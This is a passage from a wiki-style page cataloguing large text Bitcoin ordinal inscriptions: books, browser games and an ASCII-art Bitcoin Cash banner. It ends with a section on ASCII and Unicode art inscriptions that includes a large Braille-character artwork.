- [https://ordinals.com/inscription/daed32652a82fa809be265a9a082d31e186b2b3c0cec80b52dc30e3c1c856c66i0](https://ordinals.com/inscription/daed32652a82fa809be265a9a082d31e186b2b3c0cec80b52dc30e3c1c856c66i0): 394,346 bytes (2023-02-21): Mein Kempt just like [https://ordinals.com/inscription/e15e19c587985e7dbb0554a6b51df976fdc8d95f4350b759c10b07399d34a7bbi0](https://ordinals.com/inscription/e15e19c587985e7dbb0554a6b51df976fdc8d95f4350b759c10b07399d34a7bbi0) but with the HTML in a single line, so it is slightly smaller
<a id="_790"></a>
- [https://ordinals.com/inscription/95f6909988dba38f1140d536c9cc2fdcf635c1522f93834045b093f0d4c2fdd7i0](https://ordinals.com/inscription/95f6909988dba38f1140d536c9cc2fdcf635c1522f93834045b093f0d4c2fdd7i0): 394,053 bytes (2023-02-21): HTML heart shaped index of the "Insignia Art" ordinal collection: [https://ordinalswallet.com/collection/insignia-art](https://ordinalswallet.com/collection/insignia-art). That one is kind of cool actually.
<a id="_791"></a>
- [https://ordinals.com/inscription/8af62aed75fdd9262d36d428a209a162394f0f463bf261ea253d0fb009f2277fi0](https://ordinals.com/inscription/8af62aed75fdd9262d36d428a209a162394f0f463bf261ea253d0fb009f2277fi0): 392,866 bytes (2023-09-29) [Majjhima Nikāya](https://en.wikipedia.org/wiki/Majjhima_Nikāya) (Collection of Middle-length Discourses), [Buddhist](religion.md#buddhism) text that is part of the [Pali Canon](religion.md#pali-canon), the most original Buddhist scriptures. [EMBII](software.md#embii)'s inscription of the [Bhagavad Gita](religion.md#bhagavad-gita) comes to mind. Both Pali transliteration and English translation are present side-by-side.
<a id="_792"></a>
- [https://ordinals.com/inscription/6352b23c10ef20321d59735d8597af9be96db1bab4b50d728e618a1c5a21a991i0](https://ordinals.com/inscription/6352b23c10ef20321d59735d8597af9be96db1bab4b50d728e618a1c5a21a991i0): 391,053 bytes (2023-03-03) "Satoshi Wars" [Star Wars](film.md#star-wars)-themed browser game. It is a mouse-controlled [Pong](video-game.md#pong) clone
<a id="_793"></a>
- [https://ordinals.com/inscription/ab420f90306948937432379dc3f768ef5f826714f53e0cea4e641debef460173i0](https://ordinals.com/inscription/ab420f90306948937432379dc3f768ef5f826714f53e0cea4e641debef460173i0): 389,001 bytes (2023-02-19) "[The Anarchist Cookbook by William Powell](https://en.wikipedia.org/wiki/The_Anarchist_Cookbook)". People trying to be semi-naughty as usual.
<a id="_794"></a>
- [https://ordinals.com/inscription/d8ef417a8575e0fa3da7ab11f9e91ef7582c7275f54f8b9dc587c98c676bd41ci0](https://ordinals.com/inscription/d8ef417a8575e0fa3da7ab11f9e91ef7582c7275f54f8b9dc587c98c676bd41ci0): 388,196 bytes (2023-02-12)<a id="_795"></a>
  > This fully on-chain document contains all of [Satoshi Nakamoto](cryptocurrency.md#satoshi-nakamoto)'s posts on [Bitcointalk](cryptocurrency.md#bitcoin-forum).
<a id="_796"></a>
- [https://ordinals.com/inscription/2a260692fd8aca7fc5f825fe7965c914615fe1d62f7d3e5b078228d43fd93243i0](https://ordinals.com/inscription/2a260692fd8aca7fc5f825fe7965c914615fe1d62f7d3e5b078228d43fd93243i0): 387,818 bytes (2023-04-06) an HTML page, title:<a id="_797"></a>
  > Welcome to the on-chain Pixogette Metadata Reader

  It seems t oallow you to upload images and reads metadata from the image. Didn't work too well on [ordinals.com](#ordinals-com) possibly due to narrow display port. Also it has a funny background music :-)
<a id="_798"></a>
- [https://ordinals.com/inscription/a31b8e3e279a6e28ef49fa4dca54f820abf266223976b778833e8c47991ad403i0](https://ordinals.com/inscription/a31b8e3e279a6e28ef49fa4dca54f820abf266223976b778833e8c47991ad403i0): 386,913 bytes (2023-02-19) a cute Bitcoin Cash ad:<a id="_799"></a>

  ```
  #!/bin/bash
  #
  #      ____    _   _                    _              ____                 _
  #     | __ )  (_) | |_    ___    ___   (_)  _ __      / ___|   __ _   ___  | |__
  #     |  _ \  | | | __|  / __|  / _ \  | | | '_ \    | |      / _` | / __| | '_ \
  #     | |_) | | | | |_  | (__  | (_) | | | | | | |   | |___  | (_| | \__ \ | | | |
  #     |____/  |_|  \__|  \___|  \___/  |_| |_| |_|    \____|  \__,_| |___/ |_| |_|
  #
  #      ___               _                                     _
  #     |_ _|  _ __     __| |   ___   _ __     ___   _ __     __| |   ___   _ __     ___    ___
  #      | |  | '_ \   / _` |  / _ \ | '_ \   / _ \ | '_ \   / _` |  / _ \ | '_ \   / __|  / _ \
  #      | |  | | | | | (_| | |  __/ | |_) | |  __/ | | | | | (_| | |  __/ | | | | | (__  |  __/
  #     |___| |_| |_|  \__,_|  \___| | .__/   \___| |_| |_|  \__,_|  \___| |_| |_|  \___|  \___|
  #                                  |_|
  #      ____    _                  _
  #     | __ )  | |   ___     ___  | | __
  #     |  _ \  | |  / _ \   / __| | |/ /
  #     | |_) | | | | (_) | | (__  |   <
  #     |____/  |_|  \___/   \___| |_|\_\
  ```

  It appears to contain the entire first fork block of Bitcoi Cash from mainline bitcoin.
<a id="_800"></a>
- [https://ordinals.com/inscription/f7ece21e1dc74874d7a6e5e11b77941be2db6f383d053242a40b63e0a28445ffi0](https://ordinals.com/inscription/f7ece21e1dc74874d7a6e5e11b77941be2db6f383d053242a40b63e0a28445ffi0): 386,819 bytes (2023-02-18) The Illiad Books I-XII
<a id="_801"></a>
- [https://ordinals.com/inscription/4f5e52115ef0fb4fc2a18cfc7f4caccfb712792c8bc318e71699a86ba4541719i0](https://ordinals.com/inscription/4f5e52115ef0fb4fc2a18cfc7f4caccfb712792c8bc318e71699a86ba4541719i0): 386,655 bytes (2023-08-09) Frogger browser clone
<a id="_802"></a>
- [https://ordinals.com/inscription/f04c0e94023e51fb995e48235773c77a471289baf44c1a3248d800a0a550c520i0](https://ordinals.com/inscription/f04c0e94023e51fb995e48235773c77a471289baf44c1a3248d800a0a550c520i0): 385,743 bytes (2023-03-25) A [Roguelike](video-game.md#roguelike) browser game
<a id="_803"></a>
- [https://ordinals.com/inscription/cd432a3e16c4a01db1df6a59b5941a69bd0cf130b24a61248643005f22a939d9i0](https://ordinals.com/inscription/cd432a3e16c4a01db1df6a59b5941a69bd0cf130b24a61248643005f22a939d9i0): 383,098 (2023-02-18) [Brave New World](https://ourbigbook.com/go/topic/brave-new-world)

###### Ordinal ASCII art inscription

↑ **Parent:** [Largest text ordinal inscription](#largest-text-ordinal-inscription)  
🏷️ **Tags:** [ASCII art](#ascii-art)

<a id="_805"></a>
This is a quick overiew of ASCII art ordinal inscriptions.

<a id="_806"></a>
It was obtained by casually scrolling down the list of the [largest text ordinal inscription](#largest-text-ordinal-inscription) on [less](software.md#less-unix) until patience ran out.

<a id="_807"></a>
Some of them are dedicated ASCII art inscriptions, others are just small highlights to other more important text like code.

<a id="_808"></a>
Although tere is some element of commercialism in some those inscriptions, a bit like what is rampant in the images, some of them are honestly just cool and possibly novel.

<a id="_809"></a>
[Ordinal ruleset inscription collections](#ordinal-ruleset-inscription-collection):<a id="_810"></a>

<a id="_811"></a>
- Humongous surfers. These are very large ASCII arts, by far the largest on the chain. Being so large allows for shades of gray to be encoded on the average luminosith of individual letters:<a id="_812"></a>

  <a id="_813"></a>
  - [tx 0f29dab68e9898f9349ef4508908f7df48dc56577cfd94ff173dd2c1b29ad7a3](https://ordinals.com/inscription/0f29dab68e9898f9349ef4508908f7df48dc56577cfd94ff173dd2c1b29ad7a3i0) (240,300 bytes): surfer girl<a id="image-surfer-girl"></a>
    <img src="https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/0f29dab68e9898f9349ef4508908f7df48dc56577cfd94ff173dd2c1b29ad7a3-0.png" alt="" height="500">

    **[Figure 86](#image-surfer-girl). Surfer girl**. Screenshot of the [https://ordinals.com/inscription/0f29dab68e9898f9349ef4508908f7df48dc56577cfd94ff173dd2c1b29ad7a3i0](https://ordinals.com/inscription/0f29dab68e9898f9349ef4508908f7df48dc56577cfd94ff173dd2c1b29ad7a3i0) [Ordinal ASCII art inscription](#ordinal-ascii-art-inscription) as seen on [Chromium](chemistry.md#chromium) 85.
  <a id="_814"></a>
  - [tx b256c850f8cab037d387d3db70643b79f5848565181b341de6c44f86307db9e7](https://ordinals.com/inscription/b256c850f8cab037d387d3db70643b79f5848565181b341de6c44f86307db9e7i0)
  <a id="_815"></a>
  - [tx d0e090aeeb289e19b8c9ad71c00daa28367e9afc4593c89513e4f96abcda8ea5](https://ordinals.com/inscription/d0e090aeeb289e19b8c9ad71c00daa28367e9afc4593c89513e4f96abcda8ea5i0)
  <a id="_816"></a>
  - [tx fb754df7b17c7b76a6508b5d4e29f89d55ada38cf1f75ca4d797c58f45b73cd1](https://ordinals.com/inscription/fb754df7b17c7b76a6508b5d4e29f89d55ada38cf1f75ca4d797c58f45b73cd1i0)
  <a id="_817"></a>
  - [tx a7e6697781513bdeddada7c32b6200fb8499624664ba056f8318541b63f68c36](https://ordinals.com/inscription/a7e6697781513bdeddada7c32b6200fb8499624664ba056f8318541b63f68c36i0)
<a id="_818"></a>
- Michael Jackson [Unicode art](art.md#unicode-art). Uses Unicode Braille characters. Marked "First Onchain Collection" and "Legends @ BTC" . Pretty cool design, the textures are quite cool and suggest glittering flying seat. Though if those ever sell, someone is going to get sued to Hell by MJ's estate!<a id="_819"></a>

  <a id="_820"></a>
  - 1/12 [tx 7e6c5f8ebb41604c79f2af60bb7af623c42b32afe4d7571ba81d7b9b44d33a2d](https://ordinals.com/inscription/7e6c5f8ebb41604c79f2af60bb7af623c42b32afe4d7571ba81d7b9b44d33a2di0)
  <a id="_821"></a>
  - 2/12 [tx 8ac99472b865d01f8724ba23b6f79ca56d30b44fae0eb509984237b722b812c3](https://ordinals.com/inscription/8ac99472b865d01f8724ba23b6f79ca56d30b44fae0eb509984237b722b812c3i0)
  <a id="_822"></a>
  - 5/12 [tx 74c94ceba91cf59de2740bcfa5bc2fdb3ea0d4499e73a12100ed365d25ae9061](https://ordinals.com/inscription/74c94ceba91cf59de2740bcfa5bc2fdb3ea0d4499e73a12100ed365d25ae9061i0)
  <a id="_823"></a>
  - 7/12 [tx 0360a10e67365ab8cc4e32f199c71cabf4fb6a08ca9773dd1d13d7f7936dcf99](https://ordinals.com/inscription/0360a10e67365ab8cc4e32f199c71cabf4fb6a08ca9773dd1d13d7f7936dcf99i0)
  <a id="_824"></a>
  - 8/12 [tx 4814880f931db8aa59e1c2aba2c227e83d928d297cbe91978458b6d83e38ddfc](https://ordinals.com/inscription/4814880f931db8aa59e1c2aba2c227e83d928d297cbe91978458b6d83e38ddfci0)
  <a id="_825"></a>
  - 9/12 [tx 909228c88176b65f5705ade5fa059030d4c646cacd171737af03ac965047fa82](https://ordinals.com/inscription/909228c88176b65f5705ade5fa059030d4c646cacd171737af03ac965047fa82i0)<a id="_826"></a>

    ```
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⡀⠀⠄⠀⠀⠄⠀⠠⠀⠀⠂⠀⠄⠂⣀⠄⠂⠠⠐⠀⡀⠂⠐⠠⠈⠄⠂⠡⠐⠈⠄⠡⠈⠄⠡⠈⠄⠡⠈⠄⠡⠈⠄⠡⠈⠄⠡⠈⠄⠡⡈⠄⡃⠌⡐⠡⡈⠄⡁⢂⠡⠐⠀⢂⠀⠂⠀⠄⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠂⠈⠀⠀⠄⠀⢀⠠⠐⠀⠠⠐⠀⠀⢁⢠⣼⣶⡶⠛⠛⢋⠀⠂⠁⠄⠈⣄⣦⣁⣂⠡⢀⠡⠈⠄⠡⠈⠄⠡⠈⠄⠡⠈⠄⠡⠈⠄⠡⠈⠄⠡⠈⢄⠡⢐⡈⠔⡈⠤⠑⡀⠆⡐⢀⠂⠌⡐⠀⠄⠂⠁⠠⠀⠀⠀⠂⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠄⠀⠁⠀⡀⠀⠂⠀⠐⠀⠠⠀⠠⠀⠀⢀⠂⠀⠄⠈⣠⣶⣿⣏⠖⠂⠁⡐⢀⠠⢁⠈⠄⣱⢏⡲⢭⡛⠿⠷⠶⢥⣈⠄⠡⠈⠄⠡⢈⠐⠡⢈⠐⠡⠈⠄⠡⠈⠄⡁⢂⠌⠄⡒⠌⡐⠡⢃⠌⡐⢀⠂⠌⡐⠠⢈⠀⠂⡁⢀⠂⠁⡀⠐⠈⠀⠀⢀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⢀⠀⠈⠀⡀⠄⠀⠄⠐⠈⠀⠀⠄⠂⣰⣿⣿⠫⠁⠀⠂⢱⠀⡀⠀⢀⡈⠼⣇⢯⡒⠥⢚⠡⠀⠀⠀⠈⠑⠶⣥⣈⠔⡈⠄⣁⠂⠌⠄⠡⢈⠂⢡⠈⡐⠄⠌⡒⢨⠐⡡⠑⡌⠰⠈⠤⢈⠐⠠⠁⠄⠂⡁⠠⠀⡀⠂⠀⠄⠐⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠠⠀⠀⠀⠂⠀⠈⠀⠀⠠⠀⠀⠠⠀⠀⡀⠠⠀⠂⠁⠚⠄⡆⢸⣿⡟⡃⠄⡂⠁⠠⠈⠳⣶⣄⡠⣸⡝⢶⢢⡑⠊⠄⡑⢢⡀⠀⠀⠀⠀⠉⠿⡆⠐⡈⠄⡈⠔⡈⠐⠂⢌⠀⠆⡐⠨⠐⠤⢁⠆⢡⠑⡈⠅⡑⠂⡄⠊⠄⠡⢈⠐⢀⠂⢁⠀⠂⠁⡀⠂⠀⠄⠀⠠⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠐⠀⠁⢀⠀⠄⠐⢀⠠⢀⠐⡀⠦⠐⡀⠀⠁⠄⠋⠉⠴⢁⠈⡙⠇⠀⠂⠁⠈⠛⢿⣷⡿⣜⢢⠙⠄⠂⠀⠠⠙⠦⠀⠀⠀⠠⠀⠄⢃⡐⡐⠠⠂⠄⢃⢁⠂⠌⡐⠠⣁⠩⠐⡌⠰⡁⢎⠰⡁⠆⢡⠀⠅⣈⠐⠠⠈⠄⢂⠠⠀⢁⠀⠄⠐⠀⠠⠐⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠠⠀⠐⠀⡀⠄⠡⠈⠐⠂⢈⠂⠑⠐⠨⡀⠀⠀⠉⠁⠈⠀⠀⠠⠐⠀⠘⡄⠂⢀⠐⠈⢠⣀⠀⠀⠀⠉⠻⢿⣷⣭⡄⠀⠀⠀⢀⠀⠀⠀⠁⠀⠌⡐⢢⣾⣿⣷⡇⠌⣀⠂⠌⡐⠠⠡⠄⢂⠱⢈⠆⠱⣈⠒⠤⢉⠄⢊⡐⠠⠈⠄⠡⢈⠠⠀⠌⢀⠠⠀⠂⠀⠄⠀⠄⠂⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⡀⠀⠈⢀⠠⠀⠄⠀⠀⠁⠀⠁⡀⡀⠀⡄⠀⢈⠁⠆⠀⡁⠀⡌⢆⠟⠛⠃⠀⠀⠀⢀⠐⢀⠀⠙⠻⣿⣶⣄⠀⠀⠀⠐⠈⢀⠐⠠⠄⣩⣿⣿⣿⠩⠐⠠⢈⡐⠠⠑⡠⠉⡄⠢⣁⠊⢅⠢⡉⢆⠡⢊⠤⠐⠡⠈⠄⡁⢂⠐⢈⠠⠀⡀⠂⠁⠠⠀⠂⢀⠀⠠⠐⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠁⠀⠀⠐⢈⠀⠀⠂⠀⠄⠀⢠⠀⡀⠀⠀⠐⠂⢁⢀⠐⠠⠀⠄⠀⠈⢀⠀⠄⠐⠤⠑⢈⠈⠄⠚⠧⠀⠡⠀⢀⠀⠄⠀⠀⢀⠈⡙⢿⣻⣤⡀⠂⠈⠀⠌⡐⠐⡀⢋⠉⢃⠰⠉⢄⠡⠠⠑⡠⢁⠒⡈⠔⡠⢉⠢⠑⡌⢢⠑⡌⠄⢃⠌⡐⢂⠐⠠⠈⠄⠂⠐⡀⠄⠁⠠⠐⠀⡀⠠⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠠⠀⠀⢀⠀⠈⠀⠀⠀⠄⠀⠀⡀⠀⢀⠀⠀⠆⠠⠈⠀⠀⠀⠠⠀⢊⠴⢂⠡⢀⠠⠐⡈⠔⡈⠀⠀⠠⠐⣀⠁⠄⠀⠀⠈⠐⠀⠠⢀⡐⡈⠄⡁⠯⣽⣆⠀⠁⢂⡐⠡⠴⠋⠀⢀⠂⡉⠄⢂⡁⠆⡁⢂⠂⡅⠢⢑⠢⢁⠣⡘⢄⠣⡐⢉⠄⢂⡐⠠⠈⠄⠡⢈⠀⠡⠀⡐⠈⢀⠐⠀⢀⠀⠄⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠠⠀⠀⠀⠂⠁⢀⠠⠀⢀⠈⠀⠀⠂⠄⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠒⣡⠒⠡⠒⠠⠄⠀⠠⠀⠀⠄⣬⠃⠀⠠⠁⠀⠄⡁⢦⠼⣰⣥⠖⠀⡀⠙⠳⡀⠀⢆⢁⠂⠡⠐⠤⢈⠐⡈⠤⠐⡐⡈⠄⢒⡀⠣⠌⡰⠁⢆⠱⡈⠆⡑⢨⠈⠤⠀⡅⠈⠄⡁⠂⠌⠐⡀⠄⠂⠀⠄⠈⠀⢀⠠⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⡀⠁⠀⢀⠀⠀⠡⠀⡐⠀⠈⡀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠂⠀⠁⠀⠀⠀⠀⢠⣈⡇⠀⠠⠐⠠⢁⠢⣉⠆⡉⠴⣁⣈⡙⠜⠃⠄⡁⢂⠘⠆⣈⠡⠀⠐⢂⠡⠐⢂⠡⢐⠠⠉⡄⠰⢁⠊⠔⣉⠢⡑⢌⢂⠱⡀⢊⠄⡡⠠⢁⠂⠄⠡⠈⠄⠐⡀⠌⠀⠂⢀⠁⠀⢀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⡀⠁⠀⠈⠀⢀⠀⠐⠀⠀⡀⠀⠡⢀⠑⡀⠠⠁⠈⡀⠂⡀⠐⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠒⣠⣽⣿⠃⠀⠁⢂⠱⣂⠑⡌⡐⣍⢲⣀⡉⠉⠀⠁⠂⠴⡲⣌⠐⡀⠆⠀⠈⡄⢂⡉⠄⢊⠄⠂⠥⠐⣁⠊⢌⠒⡠⢃⠜⡠⢊⠤⢑⠠⠒⠠⢁⠂⠌⠠⠁⠌⡀⠡⢀⠐⠈⠀⠄⢀⠈⠀⠀⡀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠠⠐⠀⠀⢀⠠⠐⠀⠀⠀⠄⠠⠐⠠⠠⠁⠀⠰⢀⠑⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠈⢠⡜⣽⣿⣯⢡⠀⠈⠠⠑⠤⢣⠐⠱⠌⢧⡍⠁⠀⠀⠈⠀⠀⠉⣏⠓⡐⢈⠀⢁⠰⢀⠂⠜⠠⡈⠜⠠⡁⢂⠅⡊⠤⠑⡌⢢⠑⡌⢢⠁⠆⡡⠑⡠⠈⡄⠡⢈⠐⢀⠂⠄⠂⢁⠀⠂⠀⡀⠄⠁⠀⡀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠂⠁⠀⠀⠄⠈⠀⠀⠐⠈⠀⠀⠀⠄⠂⠀⡀⠀⠠⠀⠡⠈⠠⠐⠀⠠⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⡘⡼⢻⣿⣲⢣⠎⡰⠀⠁⡈⠀⠄⠂⠠⠀⠀⠀⠀⠀⠁⡀⠀⠁⠀⠤⢃⠙⣆⠀⠀⣂⠡⠘⡈⠔⡐⠌⠡⡐⢡⠘⡠⢊⡑⢌⠢⡑⢌⠢⡑⡈⠤⠑⠠⡁⠄⡁⠂⠌⡀⠂⠄⠡⢀⣄⣂⣡⣤⣴⡶⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⡀⠀⠄⠀⠀⠂⠀⠐⠀⢀⠈⠀⠀⠀⠄⠀⠐⠀⠀⠄⠀⡀⠁⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡌⡐⣸⢱⢻⣿⠇⢣⠘⢄⠓⡲⠄⠢⠐⡁⢂⠁⠀⢀⠀⠄⠀⠀⢀⠈⠀⢈⠀⠣⢮⠀⠀⡤⠈⢅⠒⠠⡁⢊⠡⠐⢂⠢⢑⠂⡌⢢⠑⡌⢢⠑⠤⠑⡈⠆⠡⠐⡀⢂⠁⠂⠄⣡⣾⣿⣿⣿⣟⣯⣛⣃⣀⣐⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⡀⠐⠀⠀⠐⠈⠀⠀⠠⠈⠀⠀⠐⠀⠈⢀⠠⠐⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⡔⢠⠁⣼⡃⡎⣿⡘⡄⠣⠌⢂⠡⡌⠆⠡⠐⠠⢈⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠂⠡⢀⠀⠀⡷⢫⡄⠌⡡⠐⣁⢂⠩⠠⢑⡈⢆⡘⢄⠣⡘⠤⣉⠢⢑⠠⢁⢊⠐⡐⢠⢌⣴⣾⣿⠿⣩⢝⠲⠌⣻⣿⣟⣟⣿⣿⡿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⡀⠀⢀⠀⠁⠀⠀⢀⠈⠀⠀⠂⠈⠀⠀⠂⠁⢀⠀⠁⠀⡀⠄⠂⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠂⠔⡁⠄⢺⣿⣿⢿⣿⢦⡁⢎⡴⢋⠔⡨⢐⠡⡘⠠⠀⠀⠀⠁⠀⠀⠀⠀⠄⠂⡔⣀⠠⠀⠀⣐⢧⠾⡶⢥⢒⠠⢂⠡⢁⠂⡌⠰⢈⠢⡑⢌⠒⡄⢃⠢⢁⢂⢂⡜⡘⣜⢾⣿⣿⣥⣘⠠⢈⠐⠠⢙⣿⣻⣯⣵⣿⠁⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠁⠀⢀⠀⠁⠀⠂⠁⠠⠐⠀⡀⢀⠈⠀⡀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠄⠂⠀⠌⣸⣿⣧⣏⣮⢳⡼⢏⡘⢤⠚⢠⠃⠰⣁⠂⡁⠀⠁⠀⠀⠐⠀⠀⠀⠤⠉⠀⠁⠀⠀⢋⠌⠐⡀⣊⣾⡷⣾⠤⣁⠒⣀⠣⢈⠔⡁⢎⡰⣈⡦⡵⠎⠎⠲⢀⠁⠀⠌⠡⢋⡾⠵⢾⣤⣎⣰⢀⡆⡱⣾⠘⠀⢀⠀⠀⡀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠐⠀⠀⠂⠀⠀⡀⠈⠀⡀⠀⠁⠀⠂⠀⠄⠀⡀⠀⠠⠐⠀⠠⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢂⠁⠂⡍⣿⣿⣷⣯⡟⠱⡈⠜⡠⢉⠦⢁⢣⠦⣥⠀⠀⡀⠐⠀⠀⠀⠀⠄⠀⠠⠀⠁⠀⠀⠠⢀⠡⢐⠩⣴⣧⣍⣦⢰⡶⣤⡻⣵⢞⡻⢟⡋⣍⠒⢍⠒⡌⠐⠀⢠⠈⢀⠀⠡⠼⠀⡀⢀⠀⠉⠉⠈⠁⠀⡀⠠⠀⢀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠠⠀⠀⢀⠀⠠⠀⠀⠐⠀⠀⡀⠁⠐⠀⠠⠀⠂⠀⠐⠀⠠⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠄⢊⠱⣘⠼⣿⣿⣟⡰⢃⠬⣑⠢⢍⢂⠡⣎⠝⡂⠅⠀⠀⠀⡀⠀⠂⠀⠀⠠⢁⠂⠈⠀⠀⠁⡬⠖⠨⢀⠻⠿⠛⣈⠤⠑⠡⠼⡐⢆⡉⠌⡑⠌⠐⡀⠠⠀⢂⡁⢖⣈⠤⢜⠒⡁⠐⢀⠀⠄⠈⡀⠁⠠⠁⠀⡀⠄⠀⠀⠄⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠂⢀⠀⠁⠀⠐⠀⠈⠀⠐⠀⠁⡀⠂⠁⡀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⢈⠐⡌⢢⠌⡻⢿⣯⣟⠶⣉⠖⡡⢊⠐⡊⣑⢨⣰⡼⢃⠀⠀⠁⠀⡀⠀⠀⠄⠀⠌⠐⠈⠆⠀⠘⢂⠄⠁⠄⠂⠄⡡⠀⢠⠛⢄⠓⡀⠒⠠⠐⠠⡁⠆⡰⢀⠬⣁⠆⣑⠚⡘⠠⠀⠄⡁⠄⠂⠐⡀⠠⠀⢁⠀⠂⢀⠀⠐⠀⢀⠀⠀⠐⠈⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⡀⠀⠄⠂⠁⠀⡀⠀⠈⢀⠠⠈⠀⠁⠠⠈⢀⠀⠄⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⢀⠂⡘⢄⠫⣖⠱⢚⠟⠿⢷⣯⣶⠯⢞⡵⣮⢗⠳⣌⠣⠄⠂⠀⠂⠐⠀⠀⡀⠈⡐⠠⠈⠀⠀⢀⠂⠄⢨⠀⠆⠸⠄⠐⠠⢁⠂⠡⠤⠁⠆⡡⣒⠀⢒⠧⠂⠕⡈⠐⡀⠂⠄⠡⠈⠄⠐⠠⠁⢂⠀⠐⢀⠠⠀⠂⠀⠀⠂⠈⠀⠀⠄⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀
